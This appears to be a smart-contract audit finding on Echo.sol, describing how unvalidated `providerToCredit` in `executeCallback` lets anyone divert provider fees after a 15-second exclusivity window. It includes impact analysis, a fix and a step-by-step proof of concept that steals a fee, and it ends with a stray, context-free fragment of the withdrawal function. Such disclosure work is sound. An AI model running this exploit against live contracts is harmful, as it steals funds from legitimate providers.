### Title
Unvalidated `providerToCredit` in `executeCallback` Enables Fee Theft via Unregistered Address - (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

---

### Summary

`Echo.sol`'s `executeCallback` function accepts a caller-supplied `providerToCredit` address and credits fees to it without verifying the address is a registered provider. After the exclusivity period expires, any unprivileged caller can supply an arbitrary unregistered address as `providerToCredit`, accumulate fees there, then register that address and drain the funds — stealing fees that belong to the legitimate assigned provider.

---

### Finding Description

`executeCallback` is a permissionless `external payable` function. Its only access-control check is an exclusivity-period guard:

```solidity
if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
    require(
        providerToCredit == req.provider,
        "Only assigned provider during exclusivity period"
    );
}
```

Once the exclusivity window closes (default 15 seconds), the guard is skipped entirely. The function then unconditionally credits fees to the caller-supplied address:

```solidity
_state.providers[providerToCredit].accruedFeesInWei += SafeCast
    .toUint128((req.fee + msg.value) - pythFee);
```

There is no check that `providerToCredit` is a registered provider. `_state.providers[anyAddress].accruedFeesInWei` is a plain mapping entry that starts at zero for any address, registered or not.

The withdrawal path `withdrawAsFeeManager` checks only:

```solidity
require(
    msg.sender == _state.providers[provider].feeManager,
    "Only fee manager"
);
```

`registerProvider` does **not** reset `accruedFeesInWei`:

```solidity
function registerProvider(...) external override {
    ProviderInfo storage provider = _state.providers[msg.sender];
    require(!provider.isRegistered, "Provider already registered");
    provider.baseFeeInWei = baseFeeInWei;
    provider.feePerFeedInWei = feePerFeedInWei;
    provider.feePerGasInWei = feePerGasInWei;
    provider.isRegistered = true;
    ...
}
```

This means fees credited to an address before it registers persist after registration, and the attacker can then set themselves as fee manager and withdraw.

---

### Impact Explanation

An attacker can steal the entire fee for any request whose exclusivity period has elapsed. The legitimate assigned provider receives nothing for fulfilling the request. Because `executeCallback` is permissionless after the exclusivity window and valid price update data is publicly available from Hermes, every pending request is at risk once 15 seconds pass. This is a direct, quantifiable loss of funds for registered Echo providers.

---

### Likelihood Explanation

- Valid Pyth price update data (`updateData`) is freely obtainable from the public Hermes API at any time.
- The exclusivity period is only 15 seconds by default, so the attack window opens almost immediately after a request is made.
- No privileged role, leaked key, or governance action is required.
- The attacker only needs to monitor pending requests (via the `PriceUpdateRequested` event) and submit a transaction after the exclusivity window.

Likelihood: **High**.

---

### Recommendation

Add a registration check inside `executeCallback` before crediting fees:

```solidity
require(
    _state.providers[providerToCredit].isRegistered,
    "providerToCredit is not a registered provider"
);
```

This mirrors the pattern already used in `setProviderFee` and `withdrawAsFeeManager`, which both gate on `isRegistered` or `feeManager` membership.

---

### Proof of Concept

**Setup**: Echo contract deployed with `defaultProvider = alice`, `exclusivityPeriodSeconds = 15`.

**Step 1 – User makes a request:**
```
consumer.requestPriceUpdatesWithCallback{value: fee}(alice, publishTime, priceIds, gasLimit)
// → sequenceNumber = 1, req.provider = alice, req.fee = fee - pythFee
```

**Step 2 – Attacker waits 16 seconds, then calls `executeCallback` with their own fresh address:**
```solidity
// attacker controls `freshAddr` (not yet registered)
vm.warp(block.timestamp + 16);
echo.executeCallback(freshAddr, 1, updateData, priceIds);
// → _state.providers[freshAddr].accruedFeesInWei = req.fee
// alice receives nothing
```

**Step 3 – Attacker registers `freshAddr`:**
```solidity
vm.prank(freshAddr);
echo.registerProvider(0, 0, 0);
// isRegistered = true, accruedFeesInWei unchanged (still = req.fee)
```

**Step 4 – Attacker sets fee manager and withdraws:**
```solidity
vm.prank(freshAddr);
echo.setFeeManager(freshAddr);

vm.prank(freshAddr);
echo.withdrawAsFeeManager(freshAddr, req.fee);
// → freshAddr.balance += req.fee  ✓ stolen
```

Alice's `accruedFeesInWei` remains zero. The attacker has claimed the full provider fee for a request they did not originate.

        address provider,
        uint128 amount
    ) external override {
        require(
            msg.sender == _state.providers[provider].feeManager,
            "Only fee manager"
        );
        require(
            _state.providers[provider].accruedFeesInWei >= amount,
            "Insufficient balance"
        );

        _state.providers[provider].accruedFeesInWei -= amount;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send fees");

        emit FeesWithdrawn(msg.sender, amount);
